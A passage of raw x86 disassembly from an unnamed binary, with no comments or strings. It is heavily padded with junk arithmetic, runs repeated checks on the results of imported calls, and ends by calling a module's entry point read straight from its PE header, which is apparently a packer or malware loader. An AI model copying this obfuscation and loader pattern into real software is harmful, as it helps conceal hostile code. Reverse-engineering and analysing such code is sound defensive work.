  422e33:	mov    eax,DWORD PTR [eax+0x1c8]
  422e39:	mov    eax,DWORD PTR [eax]
  422e3b:	adc    edi,0x4659
  422e41:	mov    edx,DWORD PTR [esp+0x20]
  422e45:	xor    ebx,ebx
  422e47:	mov    edi,0x75108ae
  422e4c:	adc    ebx,DWORD PTR ds:0x42b226
  422e52:	xor    eax,edi
  422e54:	mov    ebx,DWORD PTR ds:0x42b1d2
  422e5a:	sbb    ebx,DWORD PTR ds:0x42b1ca
  422e60:	mov    DWORD PTR ds:0x42b1d2,ebx
  422e66:	mov    ebx,0x3272f5
  422e6b:	add    eax,ebx
  422e6d:	mov    DWORD PTR ds:0x42b182,0x4af1
  422e77:	mov    DWORD PTR [edx],eax
  422e79:	mov    eax,ds:0x42b042
  422e7e:	cmp    eax,0x455dedfa
  422e83:	jne    0x422fd8
  422e89:	and    DWORD PTR ds:0x42b1c6,0x0
  422e93:	mov    eax,ds:0x42b1c6
  422e98:	inc    eax
  422e99:	mov    ds:0x42b1c6,eax
  422e9e:	cmp    DWORD PTR ds:0x42b1c6,0x9
  422ea5:	ja     0x422ede
  422eab:	jmp    0x422eb9
  422eb0:	push   DWORD PTR [ebp-0x18]
  422eb3:	call   DWORD PTR ds:0x42b326
  422eb9:	cmp    DWORD PTR ds:0x42b1c6,0x8
  422ec0:	jne    0x422ed1
  422ec6:	mov    eax,ds:0x42b1c6
  422ecb:	inc    eax
  422ecc:	mov    ds:0x42b1c6,eax
  422ed1:	cmp    DWORD PTR ds:0x42b1c6,0x17
  422ed8:	jb     0x422e93
  422ede:	mov    eax,DWORD PTR [esp+0x18]
  422ee2:	and    DWORD PTR ds:0x42b1ca,0x0
  422eec:	jmp    0x422f00
  422ef1:	xor    edx,edx
  422ef3:	add    edx,DWORD PTR ds:0x42b1ca
  422ef9:	inc    edx
  422efa:	mov    DWORD PTR ds:0x42b1ca,edx
  422f00:	cmp    DWORD PTR ds:0x42b1ca,0x11
  422f07:	jae    0x422f60
  422f0d:	cmp    DWORD PTR ds:0x42b1ca,0x7
  422f14:	ja     0x422f60
  422f1a:	jmp    0x422f41
  422f1f:	push   0x42a04a
  422f24:	push   DWORD PTR [ebp-0x18]
  422f27:	push   0x268e
  422f2c:	push   0x3495
  422f31:	push   0x4b1a
  422f36:	push   0x4d1d
  422f3b:	call   DWORD PTR ds:0x42b2ea
  422f41:	cmp    DWORD PTR ds:0x42b1ca,0x6
  422f48:	jne    0x422f5b
  422f4e:	mov    edx,DWORD PTR ds:0x42b1ca
  422f54:	inc    edx
  422f55:	mov    DWORD PTR ds:0x42b1ca,edx
  422f5b:	jmp    0x422ef1
  422f60:	mov    edx,DWORD PTR ds:0x42a472
  422f66:	add    DWORD PTR ds:0x42b20e,0x42b1fe
  422f70:	mov    edx,DWORD PTR [edx+0x198]
  422f76:	sbb    DWORD PTR ds:0x42b1aa,0x42b21e
  422f80:	xor    eax,edi
  422f82:	add    eax,ebx
  422f84:	sub    DWORD PTR ds:0x42b202,0x7175
  422f8e:	mov    DWORD PTR [edx],eax
  422f90:	sbb    DWORD PTR ds:0x42b1da,edi
  422f96:	mov    eax,DWORD PTR [esp+0x18]
  422f9a:	xor    eax,edi
  422f9c:	add    DWORD PTR ds:0x42b1f2,0x42b22a
  422fa6:	add    eax,ebx
  422fa8:	or     DWORD PTR ds:0x42b1c6,0x2272
  422fb2:	mov    ds:0x42b042,eax
  422fb7:	mov    eax,DWORD PTR [esp+0x18]
  422fbb:	xor    eax,edi
  422fbd:	adc    DWORD PTR ds:0x42b192,0x42b18e
  422fc7:	add    eax,ebx
  422fc9:	sbb    DWORD PTR ds:0x42b212,0x42b1b6
  422fd3:	mov    ds:0x42a56a,eax
  422fd8:	sub    DWORD PTR ds:0x42b1a6,edi
  422fde:	mov    eax,ds:0x42a472
  422fe3:	adc    DWORD PTR ds:0x42b1b2,0x42b206
  422fed:	mov    eax,DWORD PTR [eax+0x18c]
  422ff3:	adc    DWORD PTR ds:0x42b1ee,0x42b1da
  422ffd:	mov    eax,DWORD PTR [eax]
  422fff:	or     DWORD PTR ds:0x42b20e,0x42b1c6
  423009:	mov    DWORD PTR [esp+0x60],eax
  42300d:	not    eax
  42300f:	mov    eax,0xf89c85a1
  423014:	sbb    DWORD PTR ds:0x42b1d2,0xc9c
  42301e:	mov    DWORD PTR [esp+0x10],eax
  423022:	mov    DWORD PTR [esp+0x10],eax
  423026:	sbb    DWORD PTR ds:0x42b222,0x42b21e
  423030:	mov    DWORD PTR [esp+0x10],eax
  423034:	mov    DWORD PTR [esp+0x10],ecx
  423038:	sub    DWORD PTR ds:0x42b22a,0x42b1ce
  423042:	mov    DWORD PTR [esp+0x20],eax
  423046:	mov    DWORD PTR [esp+0x20],0xf89c85bd
  42304e:	and    DWORD PTR ds:0x42b1aa,0x45c4
  423058:	mov    eax,DWORD PTR [esp+0x18]
  42305c:	add    DWORD PTR ds:0x42b1c2,0x42b18a
  423066:	xor    eax,edi
  423068:	add    eax,ebx
  42306a:	jmp    0x4231b3
  42306f:	or     DWORD PTR ds:0x42b21a,0x42b18e
  423079:	lea    eax,[esp+0x1b8]
  423080:	push   eax
  423081:	push   0x42a646
  423086:	call   DWORD PTR ds:0x42b312
  42308c:	mov    DWORD PTR ds:0x42b1e2,0x6a7b
  423096:	cmp    eax,0xffffffff
  423099:	mov    DWORD PTR ds:0x42b1be,0xa85
  4230a3:	jne    0x422c5a
  4230a9:	xor    DWORD PTR ds:0x42b1ee,0x42b19a
  4230b3:	push   0xf
  4230b5:	sub    DWORD PTR ds:0x42b1c6,0x42b1a6
  4230bf:	lea    eax,[esp+0x44]
  4230c3:	push   eax
  4230c4:	push   0x42a67a
  4230c9:	push   0x42a68e
  4230ce:	add    DWORD PTR ds:0x42b1ce,0x42b22a
  4230d8:	push   0x42a6b2
  4230dd:	dec    DWORD PTR ds:0x42b1f2
  4230e3:	call   esi
  4230e5:	imul   eax,eax,0x300000
  4230eb:	cmp    eax,0x1b00000
  4230f0:	jne    0x422c5a
  4230f6:	sbb    DWORD PTR ds:0x42b1be,0x817
  423100:	lea    eax,[esp+0x78]
  423104:	push   eax
  423105:	or     DWORD PTR ds:0x42b18e,0x42b1e2
  42310f:	push   0xffffffff
  423111:	add    DWORD PTR ds:0x42b1d6,0x42b18a
  42311b:	call   DWORD PTR ds:0x42b30a
  423121:	xor    DWORD PTR ds:0x42b1fe,0x42b19e
  42312b:	test   eax,eax
  42312d:	mov    DWORD PTR ds:0x42b20e,0x786b
  423137:	jne    0x422c5a
  42313d:	mov    eax,DWORD PTR [esp+0xc]
  423141:	mov    ecx,DWORD PTR [esp+0x20]
  423145:	or     DWORD PTR ds:0x42b1fa,0x5b03
  42314f:	xor    eax,edi
  423151:	and    DWORD PTR ds:0x42b182,0x42b1da
  42315b:	lea    eax,[eax+ecx*1+0x3272f5]
  423162:	push   eax
  423163:	sub    DWORD PTR ds:0x42b1fe,ecx
  423169:	mov    eax,DWORD PTR [esp+0x14]
  42316d:	xor    eax,edi
  42316f:	lea    eax,[ebp+eax*1+0x3272fd]
  423176:	add    DWORD PTR ds:0x42b212,0x505
  423180:	push   eax
  423181:	adc    eax,0xe25
  423186:	mov    eax,ds:0x42a472
  42318b:	push   DWORD PTR [eax+0x1bc]
  423191:	and    DWORD PTR ds:0x42b186,0x42b1b6
  42319b:	call   0x423df0
  4231a0:	mov    eax,DWORD PTR [esp+0xc]
  4231a4:	neg    edx
  4231a6:	mov    ecx,DWORD PTR [esp+0x20]
  4231aa:	xor    eax,edi
  4231ac:	lea    eax,[ecx+eax*1+0x3272f5]
  4231b3:	adc    ecx,DWORD PTR ds:0x42b1fa
  4231b9:	mov    ecx,DWORD PTR [esp+0xc]
  4231bd:	add    DWORD PTR ds:0x42b1ce,edi
  4231c3:	mov    edx,DWORD PTR [esp+0xc]
  4231c7:	and    DWORD PTR ds:0x42b1aa,0x42b186
  4231d1:	xor    edx,edi
  4231d3:	xor    ecx,edi
  4231d5:	not    DWORD PTR ds:0x42b1e6
  4231db:	add    ecx,edx
  4231dd:	mov    edx,DWORD PTR ds:0x42b20a
  4231e3:	and    DWORD PTR ds:0x42b222,edx
  4231e9:	mov    edx,DWORD PTR [esp+0xc]
  4231ed:	xor    edx,edi
  4231ef:	mov    DWORD PTR ds:0x42b182,0x14ab
  4231f9:	lea    ecx,[ecx+edx*1+0x9758df]
  423200:	mov    DWORD PTR ds:0x42b1e2,0x2305
  42320a:	mov    DWORD PTR [esp+0x20],eax
  42320e:	cmp    eax,ecx
  423210:	jbe    0x42306f
  423216:	xor    eax,ecx
  423218:	mov    eax,DWORD PTR [ebp+0xc]
  42321b:	adc    DWORD PTR ds:0x42b186,edi
  423221:	mov    ds:0x42a2f6,eax
  423226:	mov    ecx,DWORD PTR ds:0x42b1fe
  42322c:	adc    DWORD PTR ds:0x42b1f2,ecx
  423232:	mov    eax,DWORD PTR [ebp+0x10]
  423235:	inc    ecx
  423236:	mov    ds:0x42a552,eax
  42323b:	mov    eax,ds:0x42a2f6
  423240:	and    DWORD PTR ds:0x42b1b6,ebx
  423246:	mov    ecx,DWORD PTR [esp+0x30]
  42324a:	sub    eax,ebx
  42324c:	sbb    DWORD PTR ds:0x42b1be,0x1289
  423256:	xor    eax,edi
  423258:	xor    DWORD PTR ds:0x42b216,0x69d8
  423262:	mov    DWORD PTR [ecx],eax
  423264:	sub    DWORD PTR ds:0x42b1fe,0x6484
  42326e:	lea    eax,[esp+0x2c]
  423272:	mov    DWORD PTR [esp+0x6c],eax
  423276:	lea    eax,[ebp+0x4]
  423279:	sbb    DWORD PTR ds:0x42b1ba,0x4eab
  423283:	mov    DWORD PTR [esp+0x2c],eax
  423287:	lea    eax,[esp+0x1b8]
  42328e:	push   eax
  42328f:	xor    DWORD PTR ds:0x42b1b2,0x3d91
  423299:	push   0x42a6e2
  42329e:	mov    DWORD PTR ds:0x42b20e,0x4af0
  4232a8:	call   DWORD PTR ds:0x42b312
  4232ae:	cmp    eax,0xffffffff
  4232b1:	jne    0x422c5a
  4232b7:	push   0xf
  4232b9:	lea    eax,[esp+0x44]
  4232bd:	sub    DWORD PTR ds:0x42b20e,0x42b18a
  4232c7:	push   eax
  4232c8:	or     DWORD PTR ds:0x42b1ba,0x144a
  4232d2:	push   0x42a716
  4232d7:	push   0x42a72a
  4232dc:	sbb    DWORD PTR ds:0x42b1ba,0x42b182
  4232e6:	push   0x42a74e
  4232eb:	xor    DWORD PTR ds:0x42b19e,0x42b1fe
  4232f5:	call   esi
  4232f7:	imul   eax,eax,0x300000
  4232fd:	mov    DWORD PTR ds:0x42b1fa,0x26c3
  423307:	cmp    eax,0x1b00000
  42330c:	mov    DWORD PTR ds:0x42b19a,0x6081
  423316:	jne    0x422c5a
  42331c:	lea    eax,[esp+0x78]
  423320:	push   eax
  423321:	push   0xffffffff
  423323:	and    DWORD PTR ds:0x42b1e6,0x42b1aa
  42332d:	call   DWORD PTR ds:0x42b30a
  423333:	sbb    DWORD PTR ds:0x42b19a,0x42b1f6
  42333d:	test   eax,eax
  42333f:	mov    DWORD PTR ds:0x42b1a2,0x6ec1
  423349:	jne    0x422c5a
  42334f:	sub    DWORD PTR ds:0x42b1b2,0x1fda
  423359:	lea    eax,[esp+0x1b8]
  423360:	sbb    DWORD PTR ds:0x42b1fe,0x42b1ee
  42336a:	push   eax
  42336b:	push   0x42a77e
  423370:	adc    DWORD PTR ds:0x42b1f2,0x42b1c6
  42337a:	call   DWORD PTR ds:0x42b312
  423380:	mov    DWORD PTR ds:0x42b19e,0x2ae7
  42338a:	cmp    eax,0xffffffff
  42338d:	jne    0x422c5a
  423393:	adc    DWORD PTR ds:0x42b206,0x701e
  42339d:	push   0xf
  42339f:	lea    eax,[esp+0x44]
  4233a3:	or     DWORD PTR ds:0x42b18e,0x5b00
  4233ad:	push   eax
  4233ae:	push   0x42a7b2
  4233b3:	dec    DWORD PTR ds:0x42b1ba
  4233b9:	push   0x42a7c6
  4233be:	push   0x42a7ea
  4233c3:	sub    DWORD PTR ds:0x42b1e6,0x42b20e
  4233cd:	call   esi
  4233cf:	imul   eax,eax,0x300000
  4233d5:	mov    DWORD PTR ds:0x42b1be,0x6087
  4233df:	cmp    eax,0x1b00000
  4233e4:	mov    DWORD PTR ds:0x42b1d6,0x2e79
  4233ee:	jne    0x422c5a
  4233f4:	lea    eax,[esp+0x78]
  4233f8:	and    DWORD PTR ds:0x42b21e,0x6601
  423402:	push   eax
  423403:	add    DWORD PTR ds:0x42b206,0x4958
  42340d:	push   0xffffffff
  42340f:	and    DWORD PTR ds:0x42b1fa,0x42b1aa
  423419:	call   DWORD PTR ds:0x42b30a
  42341f:	mov    DWORD PTR ds:0x42b222,0x2f7c
  423429:	test   eax,eax
  42342b:	jne    0x422c5a
  423431:	and    DWORD PTR ds:0x42b1e2,0x6b99
  42343b:	lea    eax,[esp+0x1b8]
  423442:	push   eax
  423443:	add    DWORD PTR ds:0x42b22a,0x61ec
  42344d:	push   0x42a81a
  423452:	call   DWORD PTR ds:0x42b312
  423458:	mov    DWORD PTR ds:0x42b1c6,0x2abd
  423462:	cmp    eax,0xffffffff
  423465:	jne    0x422c5a
  42346b:	sbb    DWORD PTR ds:0x42b202,0x42b212
  423475:	push   0xf
  423477:	sub    DWORD PTR ds:0x42b192,0x503c
  423481:	lea    eax,[esp+0x44]
  423485:	push   eax
  423486:	push   0x42a84e
  42348b:	push   0x42a862
  423490:	push   0x42a886
  423495:	call   esi
  423497:	and    DWORD PTR ds:0x42b1c6,0x7bbe
  4234a1:	imul   eax,eax,0x300000
  4234a7:	cmp    eax,0x1b00000
  4234ac:	mov    DWORD PTR ds:0x42b1fe,0x19ae
  4234b6:	jne    0x422c5a
  4234bc:	lea    eax,[esp+0x78]
  4234c0:	push   eax
  4234c1:	neg    DWORD PTR ds:0x42b19e
  4234c7:	push   0xffffffff
  4234c9:	call   DWORD PTR ds:0x42b30a
  4234cf:	sbb    DWORD PTR ds:0x42b1aa,0x42b21e
  4234d9:	test   eax,eax
  4234db:	mov    DWORD PTR ds:0x42b196,0x192f
  4234e5:	jne    0x422c5a
  4234eb:	or     DWORD PTR ds:0x42b186,0x42b22e
  4234f5:	lea    eax,[esp+0x1b8]
  4234fc:	push   eax
  4234fd:	push   0x42a8b6
  423502:	sbb    DWORD PTR ds:0x42b216,0x426f
  42350c:	call   DWORD PTR ds:0x42b312
  423512:	cmp    eax,0xffffffff
  423515:	mov    DWORD PTR ds:0x42b18e,0x3e1f
  42351f:	jne    0x422c5a
  423525:	push   0xf
  423527:	or     DWORD PTR ds:0x42b182,0x42b1da
  423531:	lea    eax,[esp+0x44]
  423535:	push   eax
  423536:	push   0x42a8ea
  42353b:	xor    DWORD PTR ds:0x42b226,0x42b20a
  423545:	push   0x42a8fe
  42354a:	sub    DWORD PTR ds:0x42b226,0x42b22a
  423554:	push   0x42a922
  423559:	add    DWORD PTR ds:0x42b216,0x42b1d6
  423563:	call   esi
  423565:	add    DWORD PTR ds:0x42b1f6,0x38e
  42356f:	imul   eax,eax,0x300000
  423575:	mov    DWORD PTR ds:0x42b19a,0x2257
  42357f:	cmp    eax,0x1b00000
  423584:	mov    DWORD PTR ds:0x42b21a,0x2a1a
  42358e:	jne    0x422c5a
  423594:	adc    DWORD PTR ds:0x42b206,0x42b1a6
  42359e:	lea    eax,[esp+0x78]
  4235a2:	or     DWORD PTR ds:0x42b22e,0x42b1ca
  4235ac:	push   eax
  4235ad:	push   0xffffffff
  4235af:	call   DWORD PTR ds:0x42b30a
  4235b5:	and    DWORD PTR ds:0x42b182,0x42b1a6
  4235bf:	test   eax,eax
  4235c1:	mov    DWORD PTR ds:0x42b1aa,0x4002
  4235cb:	jne    0x422c5a
  4235d1:	dec    DWORD PTR ds:0x42b212
  4235d7:	lea    eax,[esp+0x1b8]
  4235de:	dec    DWORD PTR ds:0x42b18e
  4235e4:	push   eax
  4235e5:	or     DWORD PTR ds:0x42b1ea,0x42b212
  4235ef:	push   0x42a952
  4235f4:	add    DWORD PTR ds:0x42b202,0x42b216
  4235fe:	call   DWORD PTR ds:0x42b312
  423604:	cmp    eax,0xffffffff
  423607:	mov    DWORD PTR ds:0x42b212,0x6bd3
  423611:	jne    0x422c5a
  423617:	push   0xf
  423619:	add    DWORD PTR ds:0x42b1da,0x37be
  423623:	lea    eax,[esp+0x44]
  423627:	xor    DWORD PTR ds:0x42b216,0x42b21e
  423631:	push   eax
  423632:	push   0x42a986
  423637:	sub    DWORD PTR ds:0x42b1be,0x5164
  423641:	push   0x42a99a
  423646:	push   0x42a9be
  42364b:	or     DWORD PTR ds:0x42b182,0x42b21e
  423655:	call   esi
  423657:	and    DWORD PTR ds:0x42b20e,0x1f3e
  423661:	imul   eax,eax,0x300000
  423667:	mov    DWORD PTR ds:0x42b1ee,0x7e45
  423671:	cmp    eax,0x1b00000
  423676:	jne    0x422c5a
  42367c:	add    DWORD PTR ds:0x42b182,0x42b1b2
  423686:	lea    eax,[esp+0x78]
  42368a:	sub    DWORD PTR ds:0x42b1c6,0x42b1a6
  423694:	push   eax
  423695:	sbb    DWORD PTR ds:0x42b1b2,0x42b18a
  42369f:	push   0xffffffff
  4236a1:	adc    DWORD PTR ds:0x42b212,0x32d0
  4236ab:	call   DWORD PTR ds:0x42b30a
  4236b1:	or     DWORD PTR ds:0x42b1f2,0x42b1fe
  4236bb:	test   eax,eax
  4236bd:	jne    0x422c5a
  4236c3:	and    DWORD PTR ds:0x42b186,0x42b1fa
  4236cd:	lea    eax,[esp+0x1b8]
  4236d4:	xor    DWORD PTR ds:0x42b202,0x42b1fa
  4236de:	push   eax
  4236df:	push   0x42a9ee
  4236e4:	call   DWORD PTR ds:0x42b312
  4236ea:	mov    DWORD PTR ds:0x42b1ea,0x2426
  4236f4:	cmp    eax,0xffffffff
  4236f7:	mov    DWORD PTR ds:0x42b20a,0x3daf
  423701:	jne    0x422c5a
  423707:	sub    DWORD PTR ds:0x42b1e6,0x42b22a
  423711:	push   0xf
  423713:	adc    DWORD PTR ds:0x42b1ee,0x42b20a
  42371d:	lea    eax,[esp+0x44]
  423721:	and    DWORD PTR ds:0x42b20a,0x3b25
  42372b:	push   eax
  42372c:	push   0x42aa22
  423731:	sub    DWORD PTR ds:0x42b1fe,0x42b21e
  42373b:	push   0x42aa36
  423740:	mov    DWORD PTR ds:0x42b1fa,0x4cb4
  42374a:	push   0x42aa5a
  42374f:	call   esi
  423751:	inc    DWORD PTR ds:0x42b1a2
  423757:	imul   eax,eax,0x300000
  42375d:	cmp    eax,0x1b00000
  423762:	mov    DWORD PTR ds:0x42b1ea,0x7ee6
  42376c:	jne    0x422c5a
  423772:	or     DWORD PTR ds:0x42b1ea,0x7d0f
  42377c:	lea    eax,[esp+0x78]
  423780:	mov    DWORD PTR ds:0x42b1aa,0x7d0c
  42378a:	push   eax
  42378b:	adc    DWORD PTR ds:0x42b1aa,0x4970
  423795:	push   0xffffffff
  423797:	and    DWORD PTR ds:0x42b212,0x37c9
  4237a1:	call   DWORD PTR ds:0x42b30a
  4237a7:	sbb    DWORD PTR ds:0x42b21e,0x7cde
  4237b1:	test   eax,eax
  4237b3:	mov    DWORD PTR ds:0x42b206,0x64c2
  4237bd:	jne    0x422c5a
  4237c3:	sub    DWORD PTR ds:0x42b1c6,0x42b182
  4237cd:	lea    eax,[esp+0x1b8]
  4237d4:	add    DWORD PTR ds:0x42b19e,0x42b1ee
  4237de:	push   eax
  4237df:	and    DWORD PTR ds:0x42b212,0x42b1de
  4237e9:	push   0x42aa8a
  4237ee:	sbb    DWORD PTR ds:0x42b20e,0x42b1fe
  4237f8:	call   DWORD PTR ds:0x42b312
  4237fe:	mov    DWORD PTR ds:0x42b222,0x5e52
  423808:	cmp    eax,0xffffffff
  42380b:	mov    DWORD PTR ds:0x42b19a,0x4e9b
  423815:	jne    0x422c5a
  42381b:	or     DWORD PTR ds:0x42b1a6,0x4b96
  423825:	push   0xf
  423827:	lea    eax,[esp+0x44]
  42382b:	or     DWORD PTR ds:0x42b22e,0x42b192
  423835:	push   eax
  423836:	push   0x42aabe
  42383b:	push   0x42aad2
  423840:	push   0x42aaf6
  423845:	add    DWORD PTR ds:0x42b216,0x42b1ee
  42384f:	call   esi
  423851:	xor    DWORD PTR ds:0x42b1e2,0x982
  42385b:	imul   eax,eax,0x300000
  423861:	mov    DWORD PTR ds:0x42b1aa,0x5061
  42386b:	cmp    eax,0x1b00000
  423870:	jne    0x422c5a
  423876:	lea    eax,[esp+0x78]
  42387a:	xor    DWORD PTR ds:0x42b1fa,0x42b1ee
  423884:	push   eax
  423885:	push   0xffffffff
  423887:	call   DWORD PTR ds:0x42b30a
  42388d:	test   eax,eax
  42388f:	jne    0x422c5a
  423895:	add    DWORD PTR ds:0x42b21e,0x42b1ce
  42389f:	lea    eax,[esp+0x1b8]
  4238a6:	push   eax
  4238a7:	adc    DWORD PTR ds:0x42b1fe,0x6ad9
  4238b1:	push   0x42ab26
  4238b6:	or     DWORD PTR ds:0x42b1d6,0x42b1be
  4238c0:	call   DWORD PTR ds:0x42b312
  4238c6:	mov    DWORD PTR ds:0x42b216,0x33dc
  4238d0:	cmp    eax,0xffffffff
  4238d3:	mov    DWORD PTR ds:0x42b182,0x32d8
  4238dd:	jne    0x422c5a
  4238e3:	add    DWORD PTR ds:0x42b1b6,0x3dc0
  4238ed:	push   0xf
  4238ef:	lea    eax,[esp+0x44]
  4238f3:	xor    DWORD PTR ds:0x42b19a,0x42b1ce
  4238fd:	push   eax
  4238fe:	push   0x42ab5a
  423903:	add    DWORD PTR ds:0x42b1e6,0x62a8
  42390d:	push   0x42ab6e
  423912:	push   0x42ab92
  423917:	xor    DWORD PTR ds:0x42b19e,0x23c8
  423921:	call   esi
  423923:	xor    DWORD PTR ds:0x42b226,0x14f0
  42392d:	imul   eax,eax,0x300000
  423933:	mov    DWORD PTR ds:0x42b1ea,0x193b
  42393d:	cmp    eax,0x1b00000
  423942:	mov    DWORD PTR ds:0x42b1ee,0x7050
  42394c:	jne    0x422c5a
  423952:	or     DWORD PTR ds:0x42b1ce,0x3f0
  42395c:	lea    eax,[esp+0x78]
  423960:	push   eax
  423961:	push   0xffffffff
  423963:	call   DWORD PTR ds:0x42b30a
  423969:	test   eax,eax
  42396b:	jne    0x422c5a
  423971:	lea    eax,[esp+0x1b8]
  423978:	push   eax
  423979:	push   0x42abc2
  42397e:	call   DWORD PTR ds:0x42b312
  423984:	cmp    eax,0xffffffff
  423987:	jne    0x422c5a
  42398d:	push   0xf
  42398f:	lea    eax,[esp+0x44]
  423993:	push   eax
  423994:	push   0x42abf6
  423999:	push   0x42ac0a
  42399e:	push   0x42ac2e
  4239a3:	call   esi
  4239a5:	imul   eax,eax,0x300000
  4239ab:	cmp    eax,0x1b00000
  4239b0:	jne    0x422c5a
  4239b6:	lea    eax,[esp+0x78]
  4239ba:	push   eax
  4239bb:	push   0xffffffff
  4239bd:	call   DWORD PTR ds:0x42b30a
  4239c3:	test   eax,eax
  4239c5:	jne    0x422c5a
  4239cb:	lea    eax,[esp+0x1b8]
  4239d2:	push   eax
  4239d3:	push   0x42ac5e
  4239d8:	call   DWORD PTR ds:0x42b312
  4239de:	cmp    eax,0xffffffff
  4239e1:	jne    0x422c5a
  4239e7:	push   0xf
  4239e9:	lea    eax,[esp+0x44]
  4239ed:	push   eax
  4239ee:	push   0x42ac92
  4239f3:	push   0x42aca6
  4239f8:	push   0x42acca
  4239fd:	call   esi
  4239ff:	imul   eax,eax,0x300000
  423a05:	cmp    eax,0x1b00000
  423a0a:	jne    0x422c5a
  423a10:	lea    eax,[esp+0x78]
  423a14:	push   eax
  423a15:	push   0xffffffff
  423a17:	call   DWORD PTR ds:0x42b30a
  423a1d:	test   eax,eax
  423a1f:	jne    0x422c5a
  423a25:	lea    eax,[esp+0x1b8]
  423a2c:	push   eax
  423a2d:	push   0x42acfa
  423a32:	call   DWORD PTR ds:0x42b312
  423a38:	cmp    eax,0xffffffff
  423a3b:	jne    0x422c5a
  423a41:	push   0xf
  423a43:	lea    eax,[esp+0x44]
  423a47:	push   eax
  423a48:	push   0x42ad2e
  423a4d:	push   0x42ad42
  423a52:	push   0x42ad66
  423a57:	call   esi
  423a59:	imul   eax,eax,0x300000
  423a5f:	cmp    eax,0x1b00000
  423a64:	jne    0x422c5a
  423a6a:	lea    eax,[esp+0x78]
  423a6e:	push   eax
  423a6f:	push   0xffffffff
  423a71:	call   DWORD PTR ds:0x42b30a
  423a77:	test   eax,eax
  423a79:	jne    0x422c5a
  423a7f:	lea    eax,[esp+0x1b8]
  423a86:	push   eax
  423a87:	push   0x42ad96
  423a8c:	call   DWORD PTR ds:0x42b312
  423a92:	cmp    eax,0xffffffff
  423a95:	jne    0x422c5a
  423a9b:	push   0xf
  423a9d:	lea    eax,[esp+0x44]
  423aa1:	push   eax
  423aa2:	push   0x42adca
  423aa7:	push   0x42adde
  423aac:	push   0x42ae02
  423ab1:	call   esi
  423ab3:	imul   eax,eax,0x300000
  423ab9:	cmp    eax,0x1b00000
  423abe:	jne    0x422c5a
  423ac4:	lea    eax,[esp+0x78]
  423ac8:	push   eax
  423ac9:	push   0xffffffff
  423acb:	call   DWORD PTR ds:0x42b30a
  423ad1:	test   eax,eax
  423ad3:	jne    0x422c5a
  423ad9:	mov    eax,DWORD PTR [esp+0x3c]
  423add:	cmp    eax,0xf89c85a2
  423ae2:	je     0x423b41
  423ae8:	mov    eax,DWORD PTR [esp+0x18]
  423aec:	mov    ecx,DWORD PTR [esp+0x38]
  423af0:	xor    eax,edi
  423af2:	add    eax,ebx
  423af4:	cmp    eax,ecx
  423af6:	je     0x423b41
  423afc:	mov    eax,ds:0x42a472
  423b01:	mov    eax,DWORD PTR [eax+0x194]
  423b07:	mov    ecx,DWORD PTR [eax]
  423b09:	mov    eax,DWORD PTR [ecx+0x3c]
  423b0c:	push   DWORD PTR ds:0x42a552
  423b12:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  423b16:	push   DWORD PTR ds:0x42a2f6
  423b1c:	add    eax,ecx
  423b1e:	mov    ecx,DWORD PTR ds:0x42a472
  423b24:	mov    ecx,DWORD PTR [ecx+0x194]
  423b2a:	push   DWORD PTR [ecx]
  423b2c:	call   eax
  423b2e:	mov    ecx,DWORD PTR ds:0x42a472
  423b34:	mov    ecx,DWORD PTR [ecx+0x1cc]
  423b3a:	mov    DWORD PTR [ecx],eax
  423b3c:	jmp    0x423d6c
  423b41:	mov    eax,DWORD PTR [esp+0x18]
  423b45:	mov    ecx,DWORD PTR [esp+0x60]
  423b49:	xor    eax,edi
  423b4b:	add    eax,ebx
  423b4d:	cmp    eax,ecx
  423b4f:	jne    0x423bba
  423b55:	mov    eax,DWORD PTR [esp+0x18]
  423b59:	mov    ecx,DWORD PTR ds:0x42a472
  423b5f:	mov    ecx,DWORD PTR [ecx+0x198]
  423b65:	xor    eax,edi
  423b67:	add    eax,ebx
  423b69:	cmp    eax,DWORD PTR [ecx]
  423b6b:	jne    0x423b93
  423b71:	mov    eax,DWORD PTR [esp+0x18]
  423b75:	push   0xffffffff
  423b77:	push   0x70941f95
  423b7c:	xor    eax,edi
  423b7e:	add    eax,ebx
  423b80:	push   eax
  423b81:	push   0xf89c85a1
  423b86:	push   DWORD PTR [esp+0x1c]
  423b8a:	push   DWORD PTR [esp+0x2c]
  423b8e:	call   0x4224d2
  423b93:	push   DWORD PTR [esp+0xc]
  423b97:	push   DWORD PTR [esp+0x1c]
  423b9b:	call   0x401000
  423ba0:	mov    eax,DWORD PTR [esp+0x18]
  423ba4:	xor    eax,edi
  423ba6:	add    eax,ebx
  423ba8:	mov    ds:0x42a4fe,eax
  423bad:	mov    eax,DWORD PTR [esp+0x18]
  423bb1:	xor    eax,edi
  423bb3:	add    eax,ebx
  423bb5:	mov    ds:0x42a4f6,eax
  423bba:	mov    eax,DWORD PTR [esp+0x2c]
  423bbe:	test   eax,eax
  423bc0:	je     0x423d6c
  423bc6:	lea    eax,[esp+0x1b8]
  423bcd:	mov    DWORD PTR [esp+0x64],0xf152c3a
  423bd5:	push   eax
  423bd6:	mov    DWORD PTR [esp+0x78],0x712ed2f
  423bde:	mov    DWORD PTR [esp+0x74],0x373fc0d
  423be6:	push   0x42ae32
  423beb:	mov    DWORD PTR [esp+0x70],0x72670add
  423bf3:	call   DWORD PTR ds:0x42b312
  423bf9:	cmp    eax,0xffffffff
  423bfc:	jne    0x422c5a
  423c02:	push   0xf
  423c04:	lea    eax,[esp+0x44]
  423c08:	push   eax
  423c09:	push   0x42ae66
  423c0e:	push   0x42ae7a
  423c13:	push   0x42ae9e
  423c18:	call   esi
  423c1a:	imul   eax,eax,0x300000
  423c20:	cmp    eax,0x1b00000
  423c25:	jne    0x422c5a
  423c2b:	lea    eax,[esp+0x78]
  423c2f:	push   eax
  423c30:	push   0xffffffff
  423c32:	call   DWORD PTR ds:0x42b30a
  423c38:	test   eax,eax
  423c3a:	jne    0x422c5a
  423c40:	call   0x41b628
  423c45:	mov    eax,DWORD PTR [esp+0x34]
  423c49:	mov    eax,DWORD PTR [esp+0xc]
  423c4d:	mov    DWORD PTR [esp+0x30],eax
  423c51:	mov    eax,DWORD PTR [esp+0x18]
  423c55:	mov    DWORD PTR [esp+0xc],eax
  423c59:	mov    eax,eax
  423c5b:	mov    eax,ds:0x42a472
  423c60:	mov    ecx,DWORD PTR [eax+0x1c0]
  423c66:	mov    edx,DWORD PTR [ecx]
  423c68:	and    DWORD PTR [esp+0x14],0x0
  423c6d:	mov    esi,0xfabdbed4
  423c72:	add    edx,esi
  423c74:	adc    DWORD PTR [esp+0x14],0xffffffff
  423c79:	mov    ecx,0x8a29a141
  423c7e:	xor    edx,ecx
